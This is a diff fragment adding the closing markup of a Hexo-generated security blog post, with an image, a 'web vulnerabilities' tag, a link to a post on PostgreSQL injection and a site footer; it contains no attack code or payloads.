+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/image-20250812012700512.png" alt="image-20250812012700512"></p>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Web%E6%BC%8F%E6%B4%9E/"># Web漏洞</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2025/08/09/Postgresql%E6%B3%A8%E5%85%A5/">postgresql注入</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© n55iwi | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
